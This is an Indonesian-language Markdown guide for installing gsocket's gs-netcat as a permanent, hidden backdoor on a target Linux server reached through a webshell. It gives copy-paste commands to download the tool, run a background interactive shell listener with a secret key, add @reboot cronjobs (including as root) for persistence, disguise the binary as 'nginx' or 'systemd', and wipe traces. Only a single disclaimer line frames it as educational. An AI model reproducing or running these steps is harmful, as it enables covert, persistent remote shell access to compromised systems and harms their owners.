# 🚀 Panduan Lengkap Setup Gsocket + Cronjob

> Panduan praktis untuk menginstall dan mengkonfigurasi Gsocket sebagai backdoor permanent dengan auto-start via cronjob

---

## 📋 **Daftar Isi**
- [Persiapan](#-persiapan)
- [Instalasi](#-langkah-1-download-binary)
- [Konfigurasi](#-langkah-4-jalankan-di-background)
- [Cronjob Auto-Start](#-langkah-7-pasang-cronjob-biar-jalan-otomatis-saat-reboot)
- [Koneksi dari Client](#-langkah-6-konek-dari-ubuntu-kamu)
- [Troubleshooting](#%EF%B8%8F-troubleshooting)
- [Uninstall](#-langkah-8-opsional-bersihkan-jejak)

---

## 📋 **Persiapan**

| Komponen | Spesifikasi |
|----------|-------------|
| **Server Target** | Linux x86_64 (user: `man2gres`) |
| **Komputer Kamu** | Ubuntu (client) |
| **Secret Key** | `cx0r4123` (bisa diganti) |
| **Tools** | curl, tar, crontab |

---

## 📝 **Langkah 1: Download Binary**

Di webshell server target, jalankan perintah berikut:

```bash
curl -L https://github.com/hackerschoice/gsocket/releases/download/v1.4.43/gsocket_linux-x86_64.tar.gz -o /home/man2gres/tmp/gs.tar.gz
```

### ✅ Verifikasi
```bash
ls -lh /home/man2gres/tmp/gs.tar.gz
```
**Harusnya:** ukuran **~1.3 MB** (bukan 0 bytes)

---

## 📦 **Langkah 2: Ekstrak File**

```bash
tar xzf /home/man2gres/tmp/gs.tar.gz -C /home/man2gres/tmp/
```

---

## 🔓 **Langkah 3: Kasih Izin Eksekusi**

```bash
chmod +x /home/man2gres/tmp/gs-netcat /home/man2gres/tmp/gsocket
```

### ✅ Verifikasi
```bash
ls -la /home/man2gres/tmp/gs*
```
**Hasil yang diharapkan:**
- `gs-netcat` (2.8 MB) dengan izin `-rwxr-xr-x`
- `gsocket` (5 KB) dengan izin `-rwxr-xr-x`

---

## 🚀 **Langkah 4: Jalankan di Background**

```bash
nohup /home/man2gres/tmp/gs-netcat -s "cx0r4123" -li > /dev/null 2>&1 &
```

### 📖 Penjelasan Command
| Parameter | Fungsi |
|-----------|--------|
| `nohup` | Tetap jalan walau terminal ditutup |
| `-s "cx0r4123"` | Secret key (ganti sesuai keinginan) |
| `-l` | Mode listen (menunggu koneksi) |
| `-i` | Interactive shell |
| `> /dev/null 2>&1 &` | Jalan di background, tanpa output |

---

## ✅ **Langkah 5: Verifikasi Proses Jalan**

```bash
ps aux | grep /home/man2gres/tmp/gs-netcat | grep -v grep
```

### 📤 Output yang Diharapkan
```
man2gres  12345  0.0  0.1  2846128  1234 ?  S    16:30   0:00 /home/man2gres/tmp/gs-netcat -s ******** -li
```

---

## 🔗 **Langkah 6: Konek dari Ubuntu Kamu**

Di terminal Ubuntu client:

```bash
gs-netcat -s "cx0r4123" -i
```

### ✅ Berhasil!
Jika berhasil, kamu akan mendapatkan **shell server target** di terminal Ubuntu-mu! 🎉

---

## 🔄 **Langkah 7: Pasang Cronjob (Biar Jalan Otomatis Saat Reboot)**

Cronjob akan menjalankan `gs-netcat` secara otomatis setiap kali server reboot.

### 🔧 Cara 1: Crontab User `man2gres`
```bash
(crontab -l 2>/dev/null; echo "@reboot cd /home/man2gres/tmp && nohup ./gs-netcat -s 'cx0r4123' -li > /dev/null 2>&1 &") | crontab -
```

### 🔧 Cara 2: Crontab Root (Kalau Punya Akses)
```bash
sudo crontab -l 2>/dev/null | { cat; echo "@reboot cd /home/man2gres/tmp && /home/man2gres/tmp/gs-netcat -s 'cx0r4123' -li > /dev/null 2>&1 &"; } | sudo crontab -
```

### ✅ Verifikasi Cronjob
```bash
crontab -l
```
**Harusnya muncul:** baris `@reboot cd /home/man2gres/tmp ...`

---

## 🧹 **Langkah 8: (Opsional) Bersihkan Jejak**

### ❌ Hapus Cronjob
```bash
crontab -r
```

### ❌ Matikan Proses
```bash
ps aux | grep gs-netcat | grep -v grep | awk '{print $2}' | xargs kill 2>/dev/null
```

### ❌ Hapus File
```bash
rm -f /home/man2gres/tmp/gs*
```

---

## 📋 **Ringkasan Perintah (Copy-Paste Semua)**

```bash
# 1. Download binary
curl -L https://github.com/hackerschoice/gsocket/releases/download/v1.4.43/gsocket_linux-x86_64.tar.gz -o /home/man2gres/tmp/gs.tar.gz

# 2. Ekstrak file
tar xzf /home/man2gres/tmp/gs.tar.gz -C /home/man2gres/tmp/

# 3. Beri izin eksekusi
chmod +x /home/man2gres/tmp/gs-netcat /home/man2gres/tmp/gsocket

# 4. Jalankan di background
nohup /home/man2gres/tmp/gs-netcat -s "cx0r4123" -li > /dev/null 2>&1 &

# 5. Verifikasi proses
ps aux | grep /home/man2gres/tmp/gs-netcat | grep -v grep

# 6. Pasang cronjob (auto-start saat reboot)
(crontab -l 2>/dev/null; echo "@reboot cd /home/man2gres/tmp && nohup ./gs-netcat -s 'cx0r4123' -li > /dev/null 2>&1 &") | crontab -

# 7. Cek cronjob
crontab -l
```

---

## 🔗 **Konek dari Ubuntu Kamu**

```bash
gs-netcat -s "cx0r4123" -i
```

---

## ⚠️ **Troubleshooting**

| **Masalah** | **Penyebab** | **Solusi** |
|-------------|--------------|------------|
| 📥 File download 0 bytes | URL salah atau koneksi terputus | Cek URL, pastikan file `gsocket_linux-x86_64.tar.gz` |
| 📦 `tar: not in gzip format` | File corrupt | Hapus file dan download ulang |
| 🔌 `Address already in use` | Port sudah dipakai | Coba tambahkan `-p 60001` untuk port berbeda |
| 🔄 Proses gak jalan di reboot | Cronjob tidak terpasang | Cek dengan `crontab -l`, pastikan path absolut |
| ❌ `command not found: gs-netcat` | Client belum terinstall | Install gsocket di Ubuntu client |

---

## 🛠️ **Instalasi Client di Ubuntu**

Kalau belum punya `gs-netcat` di Ubuntu, install dulu:

```bash
# Download client
curl -L https://github.com/hackerschoice/gsocket/releases/download/v1.4.43/gsocket_linux-x86_64.tar.gz -o /tmp/gs-client.tar.gz

# Ekstrak
tar xzf /tmp/gs-client.tar.gz -C /tmp/

# Pindahkan ke PATH
sudo mv /tmp/gs-netcat /usr/local/bin/
sudo chmod +x /usr/local/bin/gs-netcat

# Verifikasi
which gs-netcat
```

---

## 📊 **Flowchart Keseluruhan**

```
1. Download Binary
   ↓
2. Ekstrak File
   ↓
3. Chmod +x
   ↓
4. Jalankan di Background
   ↓
5. Verifikasi Proses
   ↓
6. Pasang Cronjob
   ↓
7. ✅ Selesai! Backdoor Permanen
```

---

## 🎯 **Tips Tambahan**

- 🔐 **Ganti Secret:** Ubah `cx0r4123` dengan kode rahasia yang lebih aman
- 🕵️ **Stealth Mode:** Gunakan nama file yang tidak mencurigakan, misal `nginx` atau `systemd`
- 📡 **Multiple Backdoor:** Bisa pasang beberapa instance dengan port berbeda
- 🔄 **Persistent:** Cronjob memastikan proses jalan lagi setelah reboot

---

## 📝 **Catatan Penting**

> ⚠️ **Disclaimer:** Panduan ini untuk tujuan edukasi dan pengujian keamanan. Pastikan Anda memiliki izin sebelum mengakses sistem orang lain.

---

**Selesai!** 🎉 Sekarang kamu punya backdoor permanen yang jalan otomatis setiap reboot!

---

## 🤝 **Kontribusi**

Jika ada masalah atau saran perbaikan, silakan buat issue atau pull request.

---

**Made with ❤️ for the community**
